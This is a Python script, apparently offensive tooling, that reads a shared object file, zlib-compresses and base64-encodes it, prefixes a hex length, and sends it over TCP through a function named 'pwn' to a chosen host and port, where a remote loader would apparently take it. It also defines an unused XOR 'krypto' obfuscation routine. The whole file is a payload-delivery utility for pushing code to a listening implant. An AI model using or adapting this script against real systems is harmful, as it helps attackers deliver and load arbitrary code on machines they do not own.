#!/usr/bin/env python3

import argparse
import sys
import zlib
import base64
import socket
from dataclasses import dataclass


@dataclass
class customSO:
    size: bytes
    payload: bytearray

def krypto(bArray: bytes):
    '''
    XOR a byte array with a hardcoded key of 0x42
    '''
    newArray = []
    for i in bArray:
        newArray.append(i ^ 0x42)
    return bytearray(newArray)


def compress(bStr: bytes):
    """zlib compress the byte array"""
    try:
        cdata = zlib.compress(bStr)
        return cdata
    except Exception as error:
        print(f"{error}")
        sys.exit(1)

def readIn(fName:str):
    """read in file as byte array"""
    try:
        with open(fName, "rb") as fin:
            return fin.read()
    except IOError as err:
        print(f"{err}")
        sys.exit(1)


def pwn(ipAddr, port, payload):
    """connect to destination host and send byte array"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ipAddr, int(port)))
        print(f"First N-bytes of payload: {payload[0:10]}")
        s.sendall(payload)
    except ConnectionRefusedError as connError:
        print(f"Conn Error: {connError}")
    print("Data sent!")

if __name__ == "__main__":

    args = argparse.ArgumentParser()
    args.add_argument("--file", "-f", required=True,
                      help="Specify shared object to load")

    args.add_argument("--dest", "-d", required=True,
                      default="localhost", help="Specify destination server")

    args.add_argument("--port", "-p", required=True,
                      default="1776", help="Specify destination port")

    parser = args.parse_args()
    bArray = readIn(parser.file)
    print(f"Raw byte arrayis : {str(len(bArray))}")
    lenArray = hex(len(bArray))[2:] # strip the 0x
    cArray = compress(bArray)
    encoded_array = base64.b64encode(cArray)
    CSO = customSO(lenArray, encoded_array)
    fPayload = bytes(CSO.size, "UTF-8") + CSO.payload
    pwn(parser.dest, parser.port, fPayload)
